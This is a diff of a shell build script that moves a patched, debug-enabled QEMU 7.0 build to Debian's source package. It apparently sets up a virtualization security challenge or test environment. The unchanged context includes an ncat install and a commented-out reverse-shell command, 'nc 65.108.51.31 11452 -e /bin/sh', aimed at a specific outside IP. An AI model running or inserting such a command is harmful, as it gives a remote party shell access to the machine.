@@ -10,9 +10,13 @@ build_qemu () {
   #https://wiki.qemu.org/Testing/DockerBuild
   apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev ninja-build uuid-dev uuid -y
   mkdir ~/qemu; cd ~/qemu
-  curl -L https://download.qemu.org/qemu-7.0.0.tar.xz -o qemu.tar.xz
-  tar xvJf qemu.tar.xz > /dev/null
-  cd qemu-7.0.0
+  #build debian version
+  apt-get source qemu-system-x86=1:7.0+dfsg-7 -y
+  dpkg-source --auto-commit -b qemu-7.0+dfsg/
+  cd qemu-7.0+dfsg
+  #curl -L https://download.qemu.org/qemu-7.0.0.tar.xz -o qemu.tar.xz
+  #tar xvJf qemu.tar.xz > /dev/null
+  #cd qemu-7.0.0
   tar xf /patch/qemu.tar
   ./configure --target-list=x86_64-softmmu --enable-debug > /dev/null
   make -j$(nproc) > /dev/null
@@ -69,6 +73,7 @@ build_kernel() {
 #linux-image-5.10.0-15-amd64
 #linux-image-5.18.0-2-amd64
 echo "deb http://deb.debian.org/debian unstable main" > /etc/apt/sources.list
+echo "deb-src http://http.us.debian.org/debian unstable main" >> /etc/apt/sources.list
 apt update
 apt install -y ncat
 #nc 65.108.51.31 11452 -e /bin/sh
